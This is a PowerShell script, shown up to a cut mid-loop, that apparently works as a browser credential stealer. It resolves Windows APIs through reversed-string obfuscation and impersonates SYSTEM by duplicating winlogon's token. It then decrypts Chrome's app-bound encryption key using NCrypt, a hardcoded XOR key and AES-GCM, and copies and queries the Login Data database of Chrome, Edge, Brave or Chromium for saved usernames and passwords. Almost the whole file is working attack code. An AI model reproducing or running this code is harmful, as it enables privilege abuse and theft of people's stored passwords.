try { Add-Type -AssemblyName System.Security } catch {}

function Invoke-FunctionLookup {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [string] $moduleName,

        [Parameter(Position = 1, Mandatory = $true)] 
        [string] $functionName
    )

    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $X1 }).GetType($X2)
    $PtrOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null)

    if ($PtrOverload) {

        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
    }
    else {
        $handleRefOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)

        if (!$handleRefOverload) { throw "Could not find a suitable GetProcAddress overload on this system." }

        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
        return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
    }
}

function Invoke-GetDelegate {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [Type[]] $parameterTypes,

        [Parameter(Position = 1, Mandatory = $false)] 
        [Type] $returnType = [Void]
    )

    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName($N1)),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $moduleBuilder = $assemblyBuilder.DefineDynamicModule($N2, $false)

    $typeBuilder = $moduleBuilder.DefineType(
        $N3, 
        [System.Reflection.TypeAttributes]::Class -bor 
        [System.Reflection.TypeAttributes]::Public -bor 
        [System.Reflection.TypeAttributes]::Sealed -bor 
        [System.Reflection.TypeAttributes]::AnsiClass -bor 
        [System.Reflection.TypeAttributes]::AutoClass, 
        [System.MulticastDelegate]
    )

    $constructorBuilder = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )

    $constructorBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::NewSlot -bor 
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )

    $methodBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    return $typeBuilder.CreateType()
}


$X1 = ([regex]::Matches("lld.metsyS", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X2 = ([regex]::Matches("sdohteMevitaNefasnU.23niW.tfosorciM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X3 = ([regex]::Matches("sserddAcorPteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X4 = ([regex]::Matches("eldnaHeludoMteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

$N1 = ([regex]::Matches("etageleDdetcelfeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$N2 = ([regex]::Matches("eludoMyromeMnI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$N3 = ([regex]::Matches("epyTetageleDyM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

# ======================================================================
# Load Library Function
# ======================================================================
$LoadLibraryADelegate = Invoke-GetDelegate -ParameterTypes @([string]) -ReturnType ([IntPtr])
$LoadLibraryAFunctionPointer = Invoke-FunctionLookup -ModuleName "kernel32.dll" -FunctionName "LoadLibraryA"

$LoadLibraryA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $LoadLibraryAFunctionPointer,
    $LoadLibraryADelegate
)

# ======================================================================
# Winsqlite3.dll Function Pointers
# ======================================================================

$LibraryHandle = $LoadLibraryA.Invoke("winsqlite3.dll")

if ($LibraryHandle -eq [IntPtr]::Zero) {
    return "[-] Failed to load winsqlite3.dll"
}

$Sqlite3OpenV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_open_v2'),
    (Invoke-GetDelegate @([string], [IntPtr].MakeByRefType(), [int], [IntPtr]) ([int])))

$Sqlite3Close = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_close'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

$Sqlite3PrepareV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_prepare_v2'),
    (Invoke-GetDelegate @([IntPtr], [string], [int], [IntPtr].MakeByRefType(), [IntPtr]) ([int])))

$Sqlite3Step = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_step'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

$Sqlite3ColumnText = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_text'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))

$Sqlite3ColumnBlob = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_blob'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))

$Sqlite3ColumnByte = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_bytes'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([int])))

$Sqlite3ErrMsg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_errmsg'),
    (Invoke-GetDelegate @([IntPtr]) ([IntPtr])))

$Sqlite3Finalize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_finalize'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))


# ======================================================================
# Token Handling Function Pointers
# ======================================================================

$OpenProcessFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Kernel32.dll' -FunctionName 'OpenProcess'),
    (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))

$OpenProcessTokenFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'OpenProcessToken'),
    (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([bool])))

$DuplicateTokenExFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'DuplicateTokenEx'),
    (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([bool])))

$ImpersonateLoggedOnUserFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'ImpersonateLoggedOnUser'),
    (Invoke-GetDelegate @([IntPtr]) ([bool])))


# ======================================================================
# Simple P/Invoke (Advapi32)(Not sure how to get this working with dynamic function call)
# ======================================================================

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
}
"@


# ======================================================================
# NCrypt.dll Function Pointers
# ======================================================================

$LibraryHandle = $LoadLibraryA.Invoke("ncrypt.dll")

if ($LibraryHandle -eq [IntPtr]::Zero) {
    return "[-] Failed to load ncrypt.dll"
}


$NCryptOpenStorageProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenStorageProvider'),
    (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [int]) ([int])))

$NCryptOpenKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenKey'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [int]) ([int])))

$NCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptDecrypt'),
    (Invoke-GetDelegate @([IntPtr], [byte[]], [int], [IntPtr], [byte[]], [int], [Int32].MakeByRefType(), [uint32]) ([int])))

$NCryptFreeObjectFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptFreeObject'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))


# ======================================================================
# Kernel32.dll Function Pointers
# ======================================================================

$CloseHandleFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'kernel32.dll' -FunctionName 'CloseHandle'),
    (Invoke-GetDelegate @([IntPtr]) ([bool])))
    
# ======================================================================
# BCrypt.dll Function Pointers
# ======================================================================

$LibraryHandle = $LoadLibraryA.Invoke("bcrypt.dll")

if ($LibraryHandle -eq [IntPtr]::Zero) {
    return "[-] Failed to load bcrypt.dll"
}

$BCryptOpenAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptOpenAlgorithmProvider'),
    (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [int]) ([int])))

$BCryptSetPropertyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptSetProperty'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr], [int], [int]) ([int])))

$BCryptGenerateSymmetricKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptGenerateSymmetricKey'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [byte[]], [int], [int]) ([int])))

$BCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDecrypt'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [int], [IntPtr], [IntPtr], [int], [IntPtr], [int], [Int32].MakeByRefType(), [int]) ([int])))

$BCryptDestroyKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDestroyKey'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

$BCryptCloseAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptCloseAlgorithmProvider'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([int])))

# ======================================================================
# Main script functions
# ======================================================================

# ======================================================================
# Invoke-Impersonate
# ======================================================================
function Invoke-Impersonate {

    $ProcessHandle          = [IntPtr]::Zero
    $TokenHandle            = [IntPtr]::Zero
    $DuplicateTokenHandle   = [IntPtr]::Zero

    $CurrentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    if ($CurrentSid -eq 'S-1-5-18') { return $true }

    $WinlogonProcessId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
    $ProcessHandle = $OpenProcessFunction.Invoke(0x400, $true, [int]$WinlogonProcessId)
    if ($ProcessHandle -eq [IntPtr]::Zero) { return $false }

    $TokenHandle = [IntPtr]::Zero
    if (-not $OpenProcessTokenFunction.Invoke($ProcessHandle, 0x0E, [ref]$TokenHandle)) { return $false }

    $DuplicateTokenHandle = [IntPtr]::Zero
    if (-not $DuplicateTokenExFunction.Invoke($TokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$DuplicateTokenHandle)) {
        return $false
    }

    try {
        if (-not $ImpersonateLoggedOnUserFunction.Invoke($DuplicateTokenHandle)) { return $false }

        $NewSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        return ($NewSid -eq 'S-1-5-18')
    }
    catch {
        return $false
    }
    finally {
        if ($DuplicateTokenHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($DuplicateTokenHandle) }
        if ($TokenHandle          -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($TokenHandle)          } 
        if ($ProcessHandle        -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($ProcessHandle)        }
    }
}

# ======================================================================
# Parse-ChromeKeyBlob
# ======================================================================
function Parse-ChromeKeyBlob {
    param([byte[]]$BlobData)

    $CurrentOffset = 0

    # Read header_len (4 bytes, little-endian)
    $HeaderLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
    $CurrentOffset += 4

    # Header bytes
    $HeaderBytes = $BlobData[$CurrentOffset..($CurrentOffset + $HeaderLength - 1)]
    $CurrentOffset += $HeaderLength

    # Read content_len (4 bytes, little-endian)  
    $ContentLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
    $CurrentOffset += 4

    # Validate length
    if (($HeaderLength + $ContentLength + 8) -ne $BlobData.Length) {
        throw "Length mismatch: headerLen + contentLen + 8 != blobData.Length"
    }

    # Read flag (1 byte)
    $EncryptionFlag = $BlobData[$CurrentOffset]
    $CurrentOffset += 1

    $ParseResult = @{
        Header          = $HeaderBytes
        Flag            = $EncryptionFlag
        Iv              = $null
        Ciphertext      = $null  
        Tag             = $null
        EncryptedAesKey = $null
    }

    if ($EncryptionFlag -eq 1 -or $EncryptionFlag -eq 2) {
        
        # These flags are identified but not currently supported for decryption
        # [flag|iv|ciphertext|tag] -> [1byte|12bytes|32bytes|16bytes]
        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
        $CurrentOffset += 12
        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)] 
        $CurrentOffset += 32
        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
    }
    elseif ($EncryptionFlag -eq 3) {
        
        # [flag|encrypted_aes_key|iv|ciphertext|tag] -> [1byte|32bytes|12bytes|32bytes|16bytes]
        $ParseResult.EncryptedAesKey = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
        $CurrentOffset += 32
        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
        $CurrentOffset += 12
        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
        $CurrentOffset += 32  
        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
    }
    else {
        throw "Unsupported flag: $EncryptionFlag"
    }

    return New-Object PSObject -Property $ParseResult
}

# ======================================================================
# DecryptWithAesGcm
# ======================================================================
function DecryptWithAesGcm {
    param([byte[]]$Key, [byte[]]$Iv, [byte[]]$Ciphertext, [byte[]]$Tag)

    $AlgorithmHandle = [IntPtr]::Zero
    $KeyHandle       = [IntPtr]::Zero

    try {
        
        # Open AES algorithm provider
        $AlgorithmIdPointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("AES")
        $Status             = $BCryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgorithmIdPointer, [IntPtr]::Zero, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($AlgorithmIdPointer)
        if ($Status -ne 0) { throw "BCryptOpenAlgorithmProvider failed: 0x$('{0:X8}' -f $Status)" }

        # Set chaining mode to GCM
        $PropertyNamePointer    = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingMode")
        $PropertyValuePointer   = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingModeGCM")
        $Status                 = $BCryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropertyNamePointer, $PropertyValuePointer, 32, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyNamePointer)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyValuePointer)
        if ($Status -ne 0) { throw "BCryptSetProperty failed: 0x$('{0:X8}' -f $Status)" }

        # Generate symmetric key
        $Status = $BCryptGenerateSymmetricKeyFunction.Invoke($AlgorithmHandle, [ref]$KeyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0)
        if ($Status -ne 0) { throw "BCryptGenerateSymmetricKey failed: 0x$('{0:X8}' -f $Status)" }

        # Allocate unmanaged memory for IV, ciphertext, tag, plaintext
        $CiphertextLength   = $Ciphertext.Length
        $PlaintextLength    = $CiphertextLength

        $IvPointer          = [Runtime.InteropServices.Marshal]::AllocHGlobal($Iv.Length)
        $CiphertextPointer  = [Runtime.InteropServices.Marshal]::AllocHGlobal($CiphertextLength)
        $TagPointer         = [Runtime.InteropServices.Marshal]::AllocHGlobal($Tag.Length)
        $PlaintextPointer   = [Runtime.InteropServices.Marshal]::AllocHGlobal($PlaintextLength)

        [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $IvPointer, $Iv.Length)
        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CiphertextPointer, $CiphertextLength)
        [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $TagPointer, $Tag.Length)

        # Construct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO manually
        # Size of struct = 96 bytes on 64-bit
        $AuthInfoSize = 96
        $AuthInfoPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($AuthInfoSize)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 0, $AuthInfoSize)           # cbSize
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 4, 1)                       # dwInfoVersion
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 8, $IvPointer.ToInt64())    # pbNonce
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 16, $Iv.Length)             # cbNonce
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 24, 0)                      # pbAuthData
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 32, 0)                      # cbAuthData
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 40, $TagPointer.ToInt64())  # pbTag
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 48, $Tag.Length)            # cbTag
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 56, 0)                      # pbMacContext
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 64, 0)                      # cbMacContext
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 68, 0)                      # cbAAD
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 72, 0)                      # cbData
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 80, 0)                      # dwFlags

        # Decrypt
        [int]$ResultLength = 0
        $Status = $BCryptDecryptFunction.Invoke(
            $KeyHandle,
            $CiphertextPointer,
            $CiphertextLength,
            $AuthInfoPointer,
            [IntPtr]::Zero,
            0,
            $PlaintextPointer,
            $PlaintextLength,
            [ref]$ResultLength,
            0
        )

        if ($Status -ne 0) {
            throw "BCryptDecrypt failed: 0x$('{0:X8}' -f $Status)"
        }

        # Copy result
        $PlaintextBytes = New-Object byte[] $ResultLength
        [Runtime.InteropServices.Marshal]::Copy($PlaintextPointer, $PlaintextBytes, 0, $ResultLength)
        return $PlaintextBytes
    }
    finally {
        # Cleanup
        if ($AuthInfoPointer)   { [Runtime.InteropServices.Marshal]::FreeHGlobal($AuthInfoPointer)   }
        if ($PlaintextPointer)  { [Runtime.InteropServices.Marshal]::FreeHGlobal($PlaintextPointer)  }
        if ($CiphertextPointer) { [Runtime.InteropServices.Marshal]::FreeHGlobal($CiphertextPointer) }
        if ($TagPointer)        { [Runtime.InteropServices.Marshal]::FreeHGlobal($TagPointer)        }
        if ($IvPointer)         { [Runtime.InteropServices.Marshal]::FreeHGlobal($IvPointer)         }

        if ($KeyHandle -ne [IntPtr]::Zero)          { [void]$BCryptDestroyKeyFunction.Invoke($KeyHandle) }
        if ($AlgorithmHandle -ne [IntPtr]::Zero)    { [void]$BCryptCloseAlgorithmProviderFunction.Invoke($AlgorithmHandle, 0) }
    }
}

# ======================================================================
# DecryptWithNCrypt
# ======================================================================
function DecryptWithNCrypt {
    param([byte[]]$InputData)

    try {
        # cryptographic provider and key parameters
        $ProviderName       = "Microsoft Software Key Storage Provider"
        $KeyName            = "Google Chromekey1"
        $NcryptSilentFlag   = 0x40  # NCRYPT_SILENT_FLAG

        $ProviderHandle     = [IntPtr]::Zero
        $KeyHandle          = [IntPtr]::Zero

        # Open the cryptographic storage provider
        $ProviderNamePointer    = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
        $Status                 = $NCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProviderNamePointer, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($ProviderNamePointer)

        if ($Status -ne 0) {
            throw "NCryptOpenStorageProvider failed: $Status"
        }

        # Open the specific cryptographic key
        $KeyNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
        $Status         = $NCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyNamePointer, 0, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyNamePointer)

        if ($Status -ne 0) {
            throw "NCryptOpenKey failed: $Status"
        }

        # First call to NCryptDecrypt - Calculate the required buffer size for decryption
        $OutputSize = 0
        $Status     = $NCryptDecryptFunction.Invoke(
            $KeyHandle,             # NCRYPT_KEY_HANDLE - handle to the key
            $InputData,             # pbInput           - input data to decrypt
            $InputData.Length,      # cbInput           - size of input data in bytes
            [IntPtr]::Zero,         # pPaddingInfo      - no padding info (null)
            $null,                  # pbOutput          - null pointer for size query
            0,                      # cbOutput          - zero size for query
            [ref]$OutputSize,       # pcbResult         - receives required buffer size
            $NcryptSilentFlag       # dwFlags           - silent operation flag
        )

        if ($Status -ne 0) {
            Write-Output "[*] 1st NCryptDecrypt (size query) failed ($Status)"
            return
        }

        # Second call to NCryptDecrypt - perform actual decryption
        $OutputBytes = New-Object byte[] $OutputSize
        $Status      = $NCryptDecryptFunction.Invoke(
            $KeyHandle,             # NCRYPT_KEY_HANDLE - handle to the key
            $InputData,             # pbInput           - input data to decrypt
            $InputData.Length,      # cbInput           - size of input data in bytes
            [IntPtr]::Zero,         # pPaddingInfo      - no padding info (null)
            $OutputBytes,           # pbOutput          - buffer to receive decrypted data
            $OutputBytes.Length,    # cbOutput          - size of output buffer
            [ref]$OutputSize,       # pcbResult         - receives actual bytes written
            $NcryptSilentFlag       # dwFlags           - silent operation flag
        )

        if ($Status -ne 0) {
            Write-Output "[*] 2nd NCryptDecrypt (actual decrypt) failed ($Status)"
            return $null
        }

        return $OutputBytes
    }
    finally {
        # Clean up cryptographic handles
        if ($KeyHandle -ne [IntPtr]::Zero) {
            [void]$NCryptFreeObjectFunction.Invoke($KeyHandle)
        }
        if ($ProviderHandle -ne [IntPtr]::Zero) {
            [void]$NCryptFreeObjectFunction.Invoke($ProviderHandle)
        }
    }
}


# ======================================================================
# HexToBytes
# ======================================================================
function HexToBytes {
    param([string]$HexString)

    $ByteArray = New-Object byte[] ($HexString.Length / 2)
    for ($Index = 0; $Index -lt $ByteArray.Length; $Index++) {
        $ByteArray[$Index] = [System.Convert]::ToByte($HexString.Substring($Index * 2, 2), 16)
    }
    return $ByteArray
}

# ======================================================================
# XorBytes
# ======================================================================
function XorBytes {
    param([byte[]]$FirstArray, [byte[]]$SecondArray)

    if ($FirstArray.Length -ne $SecondArray.Length) { 
        throw "Key lengths mismatch: $($FirstArray.Length) vs $($SecondArray.Length)"
    }

    $ResultArray = New-Object byte[] $FirstArray.Length
    for ($Index = 0; $Index -lt $FirstArray.Length; $Index++) {
        $ResultArray[$Index] = $FirstArray[$Index] -bxor $SecondArray[$Index]
    }
    return $ResultArray
}

# ======================================================================
# Decrypt-ChromeKeyBlob
# ======================================================================
# Needs updating to support flag type 1 and 2
function Decrypt-ChromeKeyBlob {
    param($ParsedData)

    
    if ($ParsedData.Flag -eq 3) {

        [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"

        Invoke-Impersonate > $null

        try {
            [byte[]]$DecryptedAesKey = DecryptWithNCrypt -InputData $ParsedData.EncryptedAesKey

            $XoredAesKey = XorBytes -FirstArray $DecryptedAesKey -SecondArray $XorKey
            $PlaintextBytes = DecryptWithAesGcm -Key $XoredAesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
            
            if ($Debug) { 
                
                Write-Host ([string]::Join(' ', $PlaintextBytes))
            }
            return $PlaintextBytes
        }
        
        finally {
            [void][Advapi32]::RevertToSelf()
        }
    }
    else {
        throw "[*] Unsupported flag: $($ParsedData.Flag)"
    }
}

function Get-ChromiumLoginBlobs {
    param([string]$Browser)

    switch ($Browser.ToLower()) {
        "cft"       { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default\Login Data"     }
        "chrome"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Login Data"                        }
        "edge"      { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Login Data"                }
        "brave"     { $LoginDataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default\Login Data"   }
        "chromium"  { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default\Login Data"                      }
        default     { return "`n[-] Unsupported browser name: $Browser" }
    }

    if (-not (Test-Path -Path $LoginDataPath)) {
        return $false
    }

    [int]$SqliteOk              = 0
    [int]$SqliteRow             = 100
    [int]$SqliteOpenReadOnly    = 1
    $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_LoginData_{0}.db" -f ([guid]::NewGuid()))

    try {
        $InStream = [System.IO.File]::Open($LoginDataPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $OutStream = [System.IO.File]::Open($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $InStream.CopyTo($OutStream)
        $OutStream.Close()
        $InStream.Close()
    }
    catch {
        return "[-] Unable to copy database file from $LoginDataPath"
    }

    $DatabasePointer    = [IntPtr]::Zero
    $StatementPointer   = [IntPtr]::Zero
    $LoginSqlQuery      = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'

    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
    if ($ResultCode -ne $SqliteOk) {
        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
        return "[-] sqlite3_open_v2 failed ($ResultCode): $ErrorMessage"
    }

    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $LoginSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
    if ($ResultCode -ne $SqliteOk) {
        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
        return "[-] sqlite3_prepare_v2 failed ($ResultCode): $ErrorMessage"
    }

    $LoginResults = @()
    while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
        $ActionUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
        $OriginUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
        $UsernamePointer    = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
        $PasswordPointer    = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
        $PasswordSize       = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)

        $ActionUrl  = if ($ActionUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ActionUrlPointer) } else { "" }
